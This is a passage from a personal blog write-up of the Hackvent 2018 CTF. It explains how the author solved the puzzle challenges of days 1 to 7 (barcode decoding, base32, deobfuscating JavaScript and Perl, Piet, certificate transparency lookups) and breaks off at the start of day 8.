# Hackvent 2018: Days 1-12

[ctf](/tags#ctf ) [hackvent](/tags#hackvent ) [jab](/tags#jab )
[qrcode](/tags#qrcode ) [14-segment-display](/tags#14-segment-display )
[javascript](/tags#javascript ) [dial-a-pirate](/tags#dial-a-pirate )
[certificate-transparency](/tags#certificate-transparency ) [piet](/tags#piet
) [perl](/tags#perl ) [deobfuscation](/tags#deobfuscation )
[steganography](/tags#steganography ) [stegsolve](/tags#stegsolve )
[nodejs](/tags#nodejs ) [sandbox-escape](/tags#sandbox-escape )
[crypto](/tags#crypto ) [telegram](/tags#telegram ) [sqli](/tags#sqli )  
  
Dec 31, 2018

Hackvent 2018: Days 1-12

![](https://0xdfimages.gitlab.io/img/hackvent2018-cover.png) Hackvent is a
great CTF, where a different challenge is presented each day, and the
techniques necessary to solve each challenge vary widely. Like Advent of Code,
I only made it through the first half before a combination of increased
difficulty, travel for the holidays, and Holiday Hack (and, of course,
[winning NetWars TOC](https://twitter.com/0xdf_/status/1074880711285448705))
all led to my stopping Hackvent mid-way. Still, even the first 12 challenges
has some neat stuff, and were interesting enough to write up.

## Day 1

### Challenge

![1545256851698](https://0xdfimages.gitlab.io/img/1545256851698.png)

There’s also this image:

![](https://0xdfimages.gitlab.io/img/hackvent2018-HV18_Ball_Day1_color.png)

### Solution

The major hint is the the challenge title, “Just Another Bar Code”. According
to [jabcode.org](https://jabcode.org/):

> _JAB Code_ is a 2D color bar code, which can encode more data than
> traditional black/white codes.

The site also has a scanner. Uploading this image returns:

![](https://0xdfimages.gitlab.io/img/1543837214154.png)

**Flag: HV18-L3ts-5t4r-7Th3-Phun-G33k**

## Day 2

### Challenge

![1545257578080](https://0xdfimages.gitlab.io/img/1545257578080.png)

The numbers are:

> 115 112 122 127 113 132 124 110 107 106 124 124 105 111 104 105 115 126 124
> 103 101 131 124 104 116 111 121 107 103 131 124 104 115 122 123 127 115 132
> 132 122 115 64 132 103 101 132 132 122 115 64 132 103 101 131 114 113 116
> 121 121 107 103 131 124 104 115 122 123 127 115 63 112 101 115 106 125 127
> 131 111 104 103 115 116 123 127 115 132 132 122 115 64 132 103 101 132 132
> 122 115 64 132 103 101 131 114 103 115 116 123 107 113 111 104 102 115 122
> 126 107 127 111 104 103 115 116 126 103 101 132 114 107 115 64 131 127 125
> 63 112 101 115 64 131 127 117 115 122 101 115 106 122 107 107 132 104 106
> 105 102 123 127 115 132 132 122 116 112 127 123 101 131 114 104 115 122 124
> 124 105 62 102 101 115 106 122 107 107 132 104 112 116 121 121 107 117 115
> 114 110 107 111 121 107 103 131 63 105 115 126 124 107 117 115 122 101 115
> 106 122 107 113 132 124 110 107 106 124 124 105 111 104 102 115 122 123 127
> 115 132 132 122 115 64 132 103 101 131 114 103 115 116 123 107 117 115 124
> 112 116 121 121 107 117 115 114 110 107 111 121 107 103 131 63 105 115 126
> 124 107 117 115 122 101 115 106 122 107 107 132 104 106 105 102 121 127 105
> 132 114 107 115 64 131 127 117 115 122 101 115 112 122 127 111 132 114 107
> 105 101 75 75 75 75 75 75

### Solution

The first thing that jumped out at me is the run of six 75s at the end of the
list. Looking at an ascii table, I also noticed that 75 is octal for `=`. I
pulled up a python terminal and imported the data:

    
    
    >>> with open('numbers','r') as f:
    ...   data = f.read().strip()
    ...
    >>> num_str = data.split(' ')
    >>> numbers = [int(x,8) for x in num_str]  # convert to ints using base 8
    >>> numbers
    [77, 74, 82, 87, 75, 90, 84, 72, 71, 70, 84, 84, 69, 73, 68, 69, 77, 86, 84, 67, 65, 89, 84, 68, 78, 73, 81, 71, 67, 89, 84, 68, 77, 82, 83, 87, 77, 90, 90, 82, 77, 52, 90, 67, 65, 90, 90, 82, 77, 52, 90, 67, 65, 89, 76, 75, 78, 81, 81, 71, 67, 89, 84, 68, 77, 82, 83, 87, 77, 51, 74, 65, 77, 70, 85, 87, 89, 73, 68, 67, 77, 78, 83, 87, 77, 90, 90, 82, 77, 52, 90, 67, 65, 90, 90, 82, 77, 52, 90, 67, 65, 89, 76, 67, 77, 78, 83, 71, 75, 73, 68, 66, 77, 82, 86, 71, 87, 73, 68, 67, 77, 78, 86, 67, 65, 90, 76, 71, 77, 52, 89, 87, 85, 51, 74, 65, 77, 52, 89, 87, 79, 77, 82, 65, 77, 70, 82, 71, 71, 90, 68, 70, 69, 66, 83, 87, 77, 90, 90, 82, 78, 74, 87, 83, 65, 89, 76, 68, 77, 82, 84, 84, 69, 50, 66, 65, 77, 70, 82, 71, 71, 90, 68, 74, 78, 81, 81, 71, 79, 77, 76, 72, 71, 73, 81, 71, 67, 89, 51, 69, 77, 86, 84, 71, 79, 77, 82, 65, 77, 70, 82, 71, 75, 90, 84, 72, 71, 70, 84, 84, 69, 73, 68, 66, 77, 82, 83, 87, 77, 90, 90, 82, 77, 52, 90, 67, 65, 89, 76, 67, 77, 78, 83, 71, 79, 77, 84, 74, 78, 81, 81, 71, 79, 77, 76, 72, 71, 73, 81, 71, 67, 89, 51, 69, 77, 86, 84, 71, 79, 77, 82, 65, 77, 70, 82, 71, 71, 90, 68, 70, 69, 66, 81, 87, 69, 90, 76, 71, 77, 52, 89, 87, 79, 77, 82, 65, 77, 74, 82, 87, 73, 90, 76, 71, 69, 65, 61, 61, 61, 61, 61, 61]
    
    >>> ''.join([chr(c) for c in numbers])
    'MJRWKZTHGFTTEIDEMVTCAYTDNIQGCYTDMRSWMZZRM4ZCAZZRM4ZCAYLKNQQGCYTDMRSWM3JAMFUWYIDCMNSWMZZRM4ZCAZZRM4ZCAYLCMNSGKIDBMRVGWIDCMNVCAZLGM4YWU3JAM4YWOMRAMFRGGZDFEBSWMZZRNJWSAYLDMRTTE2BAMFRGGZDJNQQGOMLHGIQGCY3EMVTGOMRAMFRGKZTHGFTTEIDBMRSWMZZRM4ZCAYLCMNSGOMTJNQQGOMLHGIQGCY3EMVTGOMRAMFRGGZDFEBQWEZLGM4YWOMRAMJRWIZLGEA======'
    

Thinking about common encoding schemes, it’s not valid base64, as that can
have at most two =s. But [base32](https://en.wikipedia.org/wiki/Base32) can
have [padding of 0, 1, 3, 4, or 6
=s](https://tools.ietf.org/html/rfc4648#section-6). base32 encoding also uses
the capital ascii alphabet and numbers, as seeing above. I’ll decode:

    
    
    >>> from base64 import b32decode
    >>> b32decode(''.join([chr(x) for x in numbers]))
    b'bcefg1g2 def bcj abcdefg1g2 g1g2 ajl abcdefm ail bcefg1g2 g1g2 abcde adjk bcj efg1jm g1g2 abcde efg1jm acdg2h abcdil g1g2 acdefg2 abefg1g2 adefg1g2 abcdg2il g1g2 acdefg2 abcde abefg1g2 bcdef '
    

Those are actually what’s known as 14-segment display codes. These codes
expanded the 8-segment display you think of for a cheap digital clock. The 14
segment display looks like this:

![](https://0xdfimages.gitlab.io/img/hackvent2018-14-Segment.png)

So `bcefg1g2` makes `H`, `del` makes `L`, etc. That gives a flag:

**Flag: HL18-7QTH-JZ1K-JKSD-GPEB-GJPU**

## Day 3

### Challenge

![1545258469149](https://0xdfimages.gitlab.io/img/1545258469149.png)

The link leads to a page with a button. As the mouse moves close to the
button, it jumps somewhere else:

![](https://0xdfimages.gitlab.io/img/hackvent2018-catchme.gif)

### Solution

I went right to the page source:

    
    
    <html>
    <head>
    <meta charset="UTF-8">
    <title>Catch me ... if you can</title>
    <style>
    body {
      background-image: url("Pine_Branch.jpg");
      background-repeat: no-repeat;
      background-size: cover;
      overflow: hidden;
      width: 100%;
      height: 100%;
    }
    
    #button {
      background-color: #e7e7e7;
      position: absolute;
      border: none;
      color: black;
      padding: 16px 32px;
      text-align: center;
      text-decoration: none;
      white-space: nowrap;
      display: none;
      font-size: 16px;
      margin: 4px 2px;
      cursor: pointer;
      border-radius: 8px;
      box-shadow: 0 8px 16px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0
        rgba(0, 0, 0, 0.19);
      text-overflow: ellipsis;
      white-space: nowrap;
      white-space: nowrap;
    }
    </style>
    </head>
    <body>
      <button id="button">Get the flag</button>
      <script src="https://code.jquery.com/jquery-3.3.1.min.js"
        integrity="sha256-FgpCb/KJQlLNfOu91ta32o/NMZxltwRo8QtmkMRdAu8=" crossorigin="anonymous"></script>
      <script src="https://code.jquery.com/ui/1.12.1/jquery-ui.min.js"
        integrity="sha256-VazP97ZCwtekAsvgPBSUwPFKdrwD3unUfSGVYrahUqU=" crossorigin="anonymous"></script>
      <script>
      	var _0x766f=["\x47\x6F\x6F\x64\x20\x74\x72\x69\x63\x6B\x21\x0A\x0A\x54\x68\x69\x73\x20\x77\x61\x73\x20\x61\x20\x6C\x69\x74\x74\x6C\x65\x20\x62\x69\x74\x20\x74\x6F\x6F\x20\x65\x61\x73\x79\x2C\x20\x77\x61\x73\x6E\x27\x74\x20\x69\x74\x3F\x20\x53\x6F\x20\x74\x72\x79\x20\x61\x6E\x6F\x74\x68\x65\x72\x20\x6D\x65\x74\x68\x6F\x64\x20\x74\x6F\x20\x67\x65\x74\x20\x74\x68\x65\x20\x66\x6C\x61\x67\x2E","\x43\x6F\x6E\x67\x72\x61\x74\x75\x6C\x61\x74\x69\x6F\x6E\x73\x21\x0A\x0A\x59\x6F\x75\x20\x67\x6F\x74\x20\x74\x68\x65\x20\x66\x6C\x61\x67\x3A\x20\x48\x56\x31\x38\x2D\x70\x46\x41\x54\x2D\x4F\x31\x44\x6C\x2D\x48\x6A\x56\x70\x2D\x6A\x4A\x4E\x45\x2D\x5A\x6A\x75\x38","\x63\x6C\x69\x63\x6B","\x23\x62\x75\x74\x74\x6F\x6E","\x77\x69\x64\x74\x68","\x68\x65\x69\x67\x68\x74","\x6F\x75\x74\x65\x72\x57\x69\x64\x74\x68","\x6F\x75\x74\x65\x72\x48\x65\x69\x67\x68\x74","\x72\x65\x73\x69\x7A\x65","\x77\x68\x69\x63\x68","\x70\x72\x65\x76\x65\x6E\x74\x44\x65\x66\x61\x75\x6C\x74","\x6B\x65\x79\x64\x6F\x77\x6E","\x6D\x6F\x75\x73\x65\x65\x6E\x74\x65\x72","\x70\x61\x67\x65\x58","\x70\x61\x67\x65\x59","\x61\x64\x64\x45\x76\x65\x6E\x74\x4C\x69\x73\x74\x65\x6E\x65\x72","\x6D\x6F\x75\x73\x65\x6D\x6F\x76\x65","\x6D\x6F\x75\x73\x65\x6F\x76\x65\x72","\x72\x61\x6E\x64\x6F\x6D","\x73\x63\x61\x6C\x65","\x6D\x69\x64\x64\x6C\x65","\x64\x69\x73\x70\x6C\x61\x79","\x6E\x6F\x6E\x65","\x63\x73\x73","\x68\x69\x64\x65","\x6C\x65\x66\x74","\x74\x6F\x70","\x62\x6C\x6F\x63\x6B","\x73\x68\x6F\x77","\x72\x65\x61\x64\x79"];$(document)[_0x766f[29]](function(){$(_0x766f[3])[_0x766f[2]](function(){if(_0xaa99x6< _0xaa99x4&& _0xaa99x4< (_0xaa99x6+ _0xaa99x8)&& _0xaa99x7< _0xaa99x5&& _0xaa99x5< (_0xaa99x7+ _0xaa99x9)){alert(_0x766f[0])}else {alert(_0x766f[1])}});$(window)[_0x766f[8]](function(){if($(window)[_0x766f[4]]()< 500|| $(window)[_0x766f[5]]()< 400){if(_0xaa99x2== false){_0xaa99x2= true;alert(_0x766f[0]);hideButton()}}else {if(_0xaa99x2= false){}};_0xaa99xa= $(window)[_0x766f[4]]()- $(_0x766f[3])[_0x766f[6]]();_0xaa99xb= $(window)[_0x766f[5]]()- $(_0x766f[3])[_0x766f[7]]()});$(_0x766f[3])[_0x766f[11]](function(_0xaa99x1){if(_0xaa99x1[_0x766f[9]]== 13|| _0xaa99x1[_0x766f[9]]== 32){_0xaa99x1[_0x766f[10]]();alert(_0x766f[0])}});var _0xaa99x2=false;var _0xaa99x3=false;var _0xaa99x4=0;var _0xaa99x5=0;var _0xaa99x6=0;var _0xaa99x7=0;var _0xaa99x8=$(_0x766f[3])[_0x766f[6]]();var _0xaa99x9=$(_0x766f[3])[_0x766f[7]]();document[_0x766f[15]](_0x766f[12],function(_0xaa99x1){_0xaa99x4= _0xaa99x1[_0x766f[13]];_0xaa99x5= _0xaa99x1[_0x766f[14]]},false);$(window)[_0x766f[16]](function(_0xaa99x1){_0xaa99x4= _0xaa99x1[_0x766f[13]];_0xaa99x5= _0xaa99x1[_0x766f[14]];if(_0xaa99xc()&& _0xaa99x3== false){_0xaa99x3= true;_0xaa99xe()}});$(_0x766f[3])[_0x766f[17]](function(_0xaa99x1){_0xaa99x4= _0xaa99x1[_0x766f[13]];_0xaa99x5= _0xaa99x1[_0x766f[14]];if(_0xaa99x3== false){_0xaa99x3== true;_0xaa99xe()}});var _0xaa99xa=$(window)[_0x766f[4]]()- $(_0x766f[3])[_0x766f[6]]();var _0xaa99xb=$(window)[_0x766f[5]]()- $(_0x766f[3])[_0x766f[7]]();_0xaa99x6= _0xaa99xa/ 2+ Math[_0x766f[18]]()* _0xaa99xa/ 2;_0xaa99x7= _0xaa99xb/ 2+ Math[_0x766f[18]]()* _0xaa99xb/ 2;_0xaa99xe();function _0xaa99xc(){lbx= _0xaa99x6+ _0xaa99x8/ 2;lby= _0xaa99x7+ _0xaa99x9/ 2;if((_0xaa99x4- _0xaa99x6)* (_0xaa99x4- lbx)+ (_0xaa99x5- lby)* (_0xaa99x5- lby)< (200* 200)){return true};return false}function _0xaa99xd(){_0xaa99x6= (Math[_0x766f[18]]()* _0xaa99xa)% _0xaa99xa;_0xaa99x7= (Math[_0x766f[18]]()* _0xaa99xb)% _0xaa99xb;while(_0xaa99xc()){_0xaa99xd()}}function _0xaa99xe(){$(_0x766f[3])[_0x766f[24]](_0x766f[19],{origin:[_0x766f[20],_0x766f[20]]},100,function(){$(_0x766f[3])[_0x766f[23]](_0x766f[21],_0x766f[22]);_0xaa99xd();_0xaa99xf()})}function _0xaa99xf(){$(_0x766f[3])[_0x766f[23]](_0x766f[25],_0xaa99x6);$(_0x766f[3])[_0x766f[23]](_0x766f[26],_0xaa99x7);$(_0x766f[3])[_0x766f[28]](_0x766f[19],{origin:[_0x766f[20],_0x766f[20]]},100,function(){$(_0x766f[3])[_0x766f[23]](_0x766f[21],_0x766f[27]);_0xaa99x2= false;_0xaa99x3= false})}});
      </script>
    </body>
    </html>
    

I grabbed the large script blob at the bottom and dropped it into
[beauttifer.io](https://beautifier.io/):

    
    
    $(document)['ready'](function() {
        $('#button')['click'](function() {
            if (_0xaa99x6 < _0xaa99x4 && _0xaa99x4 < (_0xaa99x6 + _0xaa99x8) && _0xaa99x7 < _0xaa99x5 && _0xaa99x5 < (_0xaa99x7 + _0xaa99x9)) {
                alert('Good trick!\x0A\x0AThis was a little bit too easy, wasn\'t it? So try another method to get the flag.')
            } else {
                alert('Congratulations!\x0A\x0AYou got the flag: HV18-pFAT-O1Dl-HjVp-jJNE-Zju8')
            }
        });
        $(window)['resize'](function() {
            if ($(window)['width']() < 500 || $(window)['height']() < 400) {
                if (_0xaa99x2 == false) {
                    _0xaa99x2 = true;
                    alert('Good trick!\x0A\x0AThis was a little bit too easy, wasn\'t it? So try another method to get the flag.');
                    hideButton()
                }
            } else {
                if (_0xaa99x2 = false) {}
            };
            _0xaa99xa = $(window)['width']() - $('#button')['outerWidth']();
            _0xaa99xb = $(window)['height']() - $('#button')['outerHeight']()
        });
        $('#button')['keydown'](function(_0xaa99x1) {
            if (_0xaa99x1['which'] == 13 || _0xaa99x1['which'] == 32) {
                _0xaa99x1['preventDefault']();
                alert('Good trick!\x0A\x0AThis was a little bit too easy, wasn\'t it? So try another method to get the flag.')
            }
        });
        var _0xaa99x2 = false;
        var _0xaa99x3 = false;
        var _0xaa99x4 = 0;
        var _0xaa99x5 = 0;
        var _0xaa99x6 = 0;
        var _0xaa99x7 = 0;
        var _0xaa99x8 = $('#button')['outerWidth']();
        var _0xaa99x9 = $('#button')['outerHeight']();
        document['addEventListener']('mouseenter', function(_0xaa99x1) {
            _0xaa99x4 = _0xaa99x1['pageX'];
            _0xaa99x5 = _0xaa99x1['pageY']
        }, false);
        $(window)['mousemove'](function(_0xaa99x1) {
            _0xaa99x4 = _0xaa99x1['pageX'];
            _0xaa99x5 = _0xaa99x1['pageY'];
            if (_0xaa99xc() && _0xaa99x3 == false) {
                _0xaa99x3 = true;
                _0xaa99xe()
            }
        });
        $('#button')['mouseover'](function(_0xaa99x1) {
            _0xaa99x4 = _0xaa99x1['pageX'];
            _0xaa99x5 = _0xaa99x1['pageY'];
            if (_0xaa99x3 == false) {
                _0xaa99x3 == true;
                _0xaa99xe()
            }
        });
        var _0xaa99xa = $(window)['width']() - $('#button')['outerWidth']();
        var _0xaa99xb = $(window)['height']() - $('#button')['outerHeight']();
        _0xaa99x6 = _0xaa99xa / 2 + Math['random']() * _0xaa99xa / 2;
        _0xaa99x7 = _0xaa99xb / 2 + Math['random']() * _0xaa99xb / 2;
        _0xaa99xe();
    
        function _0xaa99xc() {
            lbx = _0xaa99x6 + _0xaa99x8 / 2;
            lby = _0xaa99x7 + _0xaa99x9 / 2;
            if ((_0xaa99x4 - _0xaa99x6) * (_0xaa99x4 - lbx) + (_0xaa99x5 - lby) * (_0xaa99x5 - lby) < (200 * 200)) {
                return true
            };
            return false
        }
    
        function _0xaa99xd() {
            _0xaa99x6 = (Math['random']() * _0xaa99xa) % _0xaa99xa;
            _0xaa99x7 = (Math['random']() * _0xaa99xb) % _0xaa99xb;
            while (_0xaa99xc()) {
                _0xaa99xd()
            }
        }
    
        function _0xaa99xe() {
            $('#button')['hide']('scale', {
                origin: ['middle', 'middle']
            }, 100, function() {
                $('#button')['css']('display', 'none');
                _0xaa99xd();
                _0xaa99xf()
            })
        }
    
        function _0xaa99xf() {
            $('#button')['css']('left', _0xaa99x6);
            $('#button')['css']('top', _0xaa99x7);
            $('#button')['show']('scale', {
                origin: ['middle', 'middle']
            }, 100, function() {
                $('#button')['css']('display', 'block');
                _0xaa99x2 = false;
                _0xaa99x3 = false
            })
        }
    });
    

The flag was right there on the 6th line.

**Flag: HV18-pFAT-O1Dl-HjVp-jJNE-Zju8**

If I wanted to go a bit further and actually click the button, I could do that
too. Without looking at the javascript at all, I’ll just notice that the
button has id ‘button’ in the html:

    
    
    <button id="button">Get the flag</button>
    

I’ll open up the firefox dev tools (ctrl-shift-c), and click on console. From
there, I can click on the button:

![](https://0xdfimages.gitlab.io/img/hackvent2018-catchme-click.gif)

## Day 4

### Challenge

![1545259184280](https://0xdfimages.gitlab.io/img/1545259184280.png)

The link goes to a page with a bunch of mis-matched half pirate faces and
locations:

![1545259239796](https://0xdfimages.gitlab.io/img/1545259239796.png)

### Solution

This challenge had several things you could try to do to get part of the way,
but you’d never solve it without finding what the challenge was all about. The
title text about pirating like in the 90s has several means that come in
handy. First, it’s a reference to a pirate themed video game (which the low
quality graphics also hint at), [The Secret of Monkey
Island](https://de.wikipedia.org/wiki/The_Secret_of_Monkey_Island#cite_note-
dialapirate-4). In addition to being a pirate themed game, it also had an
anti-piracy protection at the start of the game:

> As a copy protection before the game “a little history quiz” took place,
> which asked the question “When was this pirate in [various place names]?” To
> a pirate portrait. This question was resolved with the help of a key called
> Dial-a-Pirate. Dial-a-Pirate consisted of two superimposed cardboard discs
> that could be rotated coaxially. As a result, the on the screen to be seen
> pirate face of an upper (lower cardboard disc) and a lower (upper cardboard
> disc) half was assembled, for each position by labeled holes a year assigned
> to a place could be read. The mentioned place names are Antigua, Barbados,
> Jamaica, Montserrat, Nebraska, St. Kitts and Tortuga. [4] Nebraska, the US
> state, is the only exception in this list of Caribbean islands.

[This site](http://www.oldgames.sk/codewheel/secret-of-monkey-island-dial-a-
pirate) lets you play with a digital version of that wheel. So for the first
face at the top left of the challenge, I’ll line things up like this, and then
see Nebraska has 1585:

![1545259534844](https://0xdfimages.gitlab.io/img/1545259534844.png)

Once all the years are entered, the page gives the flag:

**Flag: HV18-5o9x-4geL-7hkJ-wc4A-xp8F**

## Day 5

### Challenge

![1545259675169](https://0xdfimages.gitlab.io/img/1545259675169.png)

### Solution

There’s a few solid clues in here:

  * OSINT
  * It’s all about _transparency_
  * other virtual hosts

Look in certificate transparency logs at
https://transparencyreport.google.com. If I search for hackvent.org, I get two
results:

![1545259890131](https://0xdfimages.gitlab.io/img/1545259890131.png)

Visiting https://osintiscoolisntit.hackvent.org/ gives the flag (The site was
broken for a while and I failed to get a screenshot before the competition
ended).

**Flag: HV18-0Sin-tI5S-R34l-lyC0-oo0L**

## Day 6

### Challenge

![1545259935642](https://0xdfimages.gitlab.io/img/1545259935642.png)

The gallery looks like:

![](https://0xdfimages.gitlab.io/img/1544059925621.png)

### Solution

I immediately recognized this as Piet, an esoteric programming language which
uses colors to represent an assembly like language.

I downloaded and installed npiet from here: <https://www.bertnase.de/npiet/>.
I got it to install by downloading the full archive, `./configure`, and then
`make install`.

Then I saved the files (using numbers to get their order, from the top going
right, then bottom row to the right). Then I used bash to loop over the files,
for each decoding with `npiet`, and then replacing the endlines with `-` to
get the flag:

    
    
    root@kali# ls *.png
    0-house.png  1-trees.png  2-lake.png  3-sky.png  4-sheep.png  5-snake.png
    root@kali# for file in $(ls *.png); do npiet -e 600 ${file} 2>/dev/null | head -c 4; echo; done | head -c -1 | tr '\n' '-'; echo
    HV18-M4ke-S0m3-R3Al-N1c3-artZ
    

**Flag: HV18-M4ke-S0m3-R3Al-N1c3-artZ**

## Day 7

### Challenge

![1545260165653](https://0xdfimages.gitlab.io/img/1545260165653.png)

The code at “get flappy” is very obscure perl:

    
    
    use Term::ReadKey; sub k {ReadKey(-1)}; ReadMode 3;
    sub rk {$Q='';$Q.=$QQ while($QQ=k());$Q}; $|=1;
    print "\ec\e[0;0r\e[4242;1H\e[6n\e[1;1H";
    ($p .= $c) until (($c=k()) eq 'R'); $x=75;$dx=3;
    (($yy) = ($p =~ /(\d+);/))&&($yy-=10);
    print (("\r\n\e[40m\e[37m#".(' 'x78)."#")x100);
    $r=(sub {$M=shift; sub {$M=(($M*0x41C64E6D)+12345)&0x7FFFFFFF;$M%shift;}})
    ->(42);$s=(sub {select($HV18, $faLL, $D33p, shift);});$INT0?$H3ll:$PERL;
    @HASH=unpack("C*",pack("H*",'73740c12387652487105575346620e6c55655e1b4b6b6f541a6b2d7275'));
    for $i(0..666){$s->(0.1);print("\e[40;91m\e[${yy};${x}H.");
    $dx += int(rk() =~ / /g)*2-1; $dx = ($dx>3?3:($dx<-3?-3:$dx));
    $x += $dx; ($x>1&&$x<80)||last;
    (($i%23)&&print ("\e[4242;1H\n\e[40m\e[37m#".(' 'x78)."#"))||
    (($h=20+$r->(42))&&(print ("\e[4242;1H\n\e[40m\e[37m#".
    ((chr($HASH[$i/23]^$h))x($h-5)).(" "x10).((chr($HASH[$i/23]^$h))x(73-$h))."#")));
    (($i+13)%23)?42:((abs($x-$h)<6)||last);
    print ("\e[${yy};${x}H\e[41m\e[37m@");
    }; ReadMode 1;###################-EOF-flappy.pl###############
    

Running it gives a [flappy bird](https://flappybird.io/)-like game on the
console:

![](https://0xdfimages.gitlab.io/img/hackvent2018-flappy.gif)

### Solution

So the game is printing the flag out using the characters as lines of wall.

My approach was to first add spacing to the code:

    
    
      1 use Term::ReadKey;
      2 sub k {ReadKey(-1)};
      3 ReadMode 3;
      4 sub rk {
      5     $Q='';
      6     $Q.=$QQ while ($QQ=k());
      7     $Q
      8 };
      9 $|=1;
     10 print "\ec\e[0;0r\e[4242;1H\e[6n\e[1;1H";
     11 ($p .= $c) until (($c=k()) eq 'R');
     12 $x=75;
     13 $dx=3;
     14 (($yy) = ($p =~ /(\d+);/))&&($yy-=10);
     15 print (("\r\n\e[40m\e[37m#".(' 'x78)."#")x100);
     16 $r=(sub {
     17     $M=shift;
     18     sub {
     19         $M=(($M*0x41C64E6D)+12345)&0x7FFFFFFF;
     20         $M%shift;
     21     }
     22 })->(42);
     23 $s=(sub {
     24     select($HV18, $faLL, $D33p, shift);
     25 });
     26 $INT0?$H3ll:$PERL;
     27 @HASH=unpack("C*",pack("H*",'73740c12387652487105575346620e6c55655e1b4b6b6f541a6b2d7275'));
     28 for $i(0..666){
     29     $s->(0.1);
     30     print("\e[40;91m\e[${yy};${x}H.");
     31     $dx += int(rk() =~ / /g)*2-1;
     32     $dx = ($dx>3?3:($dx<-3?-3:$dx));
     33     $x += $dx;
     34     ($x>1&&$x<80)||last;
     35     (($i%23)&&print ("\e[4242;1H\n\e[40m\e[37m#".(' 'x78)."#"))||(($h=20+$r->(42))&&(print ("\e[4242;1H\n\e[40m\e[37m#". ((chr($HASH[$i/23]^$h))x($h-5)).(" "x10).((chr($HASH[$i/23]^$h))x(73-$h))."#")));
     36     (($i+13)%23)?42:((abs($x-$h)<6)||last);
     37     print ("\e[${yy};${x}H\e[41m\e[37m@");
     38 };
     39 ReadMode 1;
     40 ###################-EOF-flappy.pl###############
    

Just looking at that, I see a couple things jump out. I think lines 1-27 are
set up. 100 empty rows are printed at line 15. x position and velocity are set
at 12 and 13.

There’s a loop on lines 28-38. dx is changed at 31 and 32. x is changed at 33.

Lines 34-36 jump out as important. 34 and 36 do some kind of check, and if it
evaluates to false, calls `last`. Line 35 seems to print the line of flag
characters. So what happens if i comment out lines 34 and 36?

![](https://0xdfimages.gitlab.io/img/hackvent2018-flappy-mod1.gif)

So, that’s enough to write down the flag. But I can do better. I’ll comment
out more lines, making sure things work after each line, until I am left with
this:

    
    
      1 #use Term::ReadKey;
      2 #sub k {ReadKey(-1)};
      3 #ReadMode 3;
      4 #sub rk {
      5 #    $Q='';
      6 #    $Q.=$QQ while ($QQ=k());
      7 #    $Q
      8 #};
      9 #$|=1;
     10 #print "\ec\e[0;0r\e[4242;1H\e[6n\e[1;1H";
     11 #($p .= $c) until (($c=k()) eq 'R');
     12 #$x=75;
     13 #$dx=3;
     14 #(($yy) = ($p =~ /(\d+);/))&&($yy-=10);
     15 #print (("\r\n\e[40m\e[37m#".(' 'x78)."#")x100);
     16 $r=(sub {
     17     $M=shift;
     18     sub {
     19         $M=(($M*0x41C64E6D)+12345)&0x7FFFFFFF;
     20         $M%shift;
     21     }
     22 })->(42);
     23 #$s=(sub {
     24 #    select($HV18, $faLL, $D33p, shift);
     25 #});
     26 #$INT0?$H3ll:$PERL;
     27 @HASH=unpack("C*",pack("H*",'73740c12387652487105575346620e6c55655e1b4b6b6f541a6b2d7275'));
     28 for $i(0..666){
     29     #$s->(0.1);
     30     #print("\e[40;91m\e[${yy};${x}H.");
     31     #$dx += int(rk() =~ / /g)*2-1;
     32     #$dx = ($dx>3?3:($dx<-3?-3:$dx));
     33     #$x += $dx;
     34     #($x>1&&$x<80)||last;
     35     (($i%23)&&print ("\e[4242;1H\n\e[40m\e[37m#".(' 'x78)."#"))||(($h=20+$r->(42))&&(print ("\e[4242;1H\n\e[40m\e[37m#". ((chr($HASH[$i/23]^$h))x($h-5)).(" "x10).((chr($HASH[$i/23]^$h))x(73-$h))."#")));
     36     #(($i+13)%23)?42:((abs($x-$h)<6)||last);
     37     #print ("\e[${yy};${x}H\e[41m\e[37m@");
     38 };
     39 #ReadMode 1;
     40 ###################-EOF-flappy.pl###############
    

That shortens to:

    
    
      1 $r=(sub {
      2     $M=shift;
      3     sub {
      4         $M=(($M*0x41C64E6D)+12345)&0x7FFFFFFF;
      5         $M%shift;
      6     }
      7 })->(42);
      8 @HASH=unpack("C*",pack("H*",'73740c12387652487105575346620e6c55655e1b4b6b6f541a6b2d7275'));
      9 for $i(0..666){
     10     (($i%23)&&print ("\e[4242;1H\n\e[40m\e[37m#".(' 'x78)."#"))||(($h=20+$r->(42))&&(print ("\e[4242;1H\n\e[40m\e[37m#". ((chr($HASH[$i/23]^$h))x($h-5)).(" "x10).((chr($HASH[$i/23]^$h))x(73-$h))."#")));
     11 };
    

Next, let’s look at line 10. If I spread things out based on the parentheses:

    
    
    (
      ($i%23)    <-- is i divisible by 23. If not, print next row
        &&
      print ("\e[4242;1H\n\e[40m\e[37m#".(' 'x78)."#")   <-- 22 out of 23 times, print #s with 78 spaces
    )
      ||
    (
      ($h=20+$r->(42))   <-- advance h in some way
        &&
      (print ("\e[4242;1H\n\e[40m\e[37m#".  <-- print color markers and first #
             ((chr($HASH[$i/23]^$h))x($h-5)).  <-- add some number of a calculated char
             (" "x10).                       <-- add 10 spaces for the gap
             ((chr($HASH[$i/23]^$h))x(73-$h)).  <-- add more of that char
             "#")                            <-- closing #
      )
    );
    

Ok, so what part do I care about? I need to let I go it’s full range, but I
don’t have to print the non `i mod 23 == 0` times. I also really don’t need
the spaces, or more than one of the char. So I’ll replace line 10 with:

    
    
    (($i%23)) || (($h=20+$r->(42)) && (print (chr($HASH[$i/23]^$h))));
    

Now I have:

    
    
      1 $r=(sub {
      2     $M=shift;
      3     sub {
      4         $M=(($M*0x41C64E6D)+12345)&0x7FFFFFFF;
      5         $M%shift;
      6     }
      7 })->(42);
      8 @HASH=unpack("C*",pack("H*",'73740c12387652487105575346620e6c55655e1b4b6b6f541a6b2d7275'));
      9 for $i(0..666){
     10     (($i%23)) || (($h=20+$r->(42)) && (print (chr($HASH[$i/23]^$h))));
     11 };
    

Run it:

    
    
    root@kali# perl flappy-min.pl
    HV18-bMnF-racH-XdMC-xSJJ-I2fL
    

**Flag: HV18-bMnF-racH-XdMC-xSJJ-I2fL**

## Day 8

### Challenge

![1545271840103](https://0xdfimages.gitlab.io/img/1545271840103.png)

### Solution

This is the first medium challenge, and it comes in the form of a bunch of
pixels, and a hint about a snail.

I’m going to guess this is a pixel re-arranging exercise. And I’m thinking
right from the start of two possible outcomes. First, it’s 25x25, which is the
[size of a v2 qrcode](https://www.thonky.com/qr-code-tutorial/introduction).
It could also be a bit string, but the number of bits is off. 25 * 25 = 625
bits. 625 / 8 = 78.125 bytes. A HV flag is 29 bytes. Could be padding or
something, but, I’m leaning QR from the start.

